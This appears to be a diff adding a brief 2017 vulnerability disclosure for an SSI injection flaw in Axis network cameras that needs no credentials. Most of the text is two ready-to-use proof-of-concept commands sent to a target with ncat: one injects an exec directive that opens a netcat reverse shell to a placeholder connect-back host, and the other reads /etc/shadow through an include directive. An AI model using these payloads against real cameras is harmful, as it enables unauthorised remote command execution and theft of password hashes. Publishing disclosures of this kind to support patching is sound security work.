@@ -1,0 +1,28 @@
+[STX]
+
+Subject: SSI Remote Execute and Read Files
+Researcher: bashis <mcw noemail eu> (August 2016)
+Release date: October, 2017 (Old stuff that I've forgotten, fixed Q3/2016 by Axis)
+
+Attack Vector: Remote
+Authentication: Anonymous (no credentials needed)
+Conditions: The cam must be configure to allow anonymous view
+
+Execute remote commands (PoC: Connect back shell):
+echo -en "GET /incl/image_test.shtml?camnbr=%3c%21--%23exec%20cmd=%22mkfifo%20/tmp/s;nc%20-w%205%20<CONNECT BACK IP>%20<CONNECT BACK PORT>%200%3C/tmp/s|/bin/sh%3E/tmp/s%202%3E/tmp/s;rm%20/tmp/s%22%20--%3e HTTP/1.0\n\n" | ncat <TARGET IP> <TARGET PORT>
+
+Notes:
+<CONNECT BACK IP> = LHOST IP
+<CONNECT BACK PORT> = LHOST PORT
+<TARGET IP> = RHOST IP
+<TARGET PORT> RHOST PORT
+
+
+Read remote files (PoC: Read /etc/shadow - check top of the returned output):
+echo -en "GET /incl/image_test.shtml?camnbr=%3c%21--%23include%20virtual=%22../../etc/shadow%22%20--%3e HTTP/1.0\n\n" | ncat <TARGET IP> <TARGET PORT>
+
+Notes:
+<TARGET IP> = RHOST IP
+<TARGET PORT> RHOST PORT
+
+[ETX]
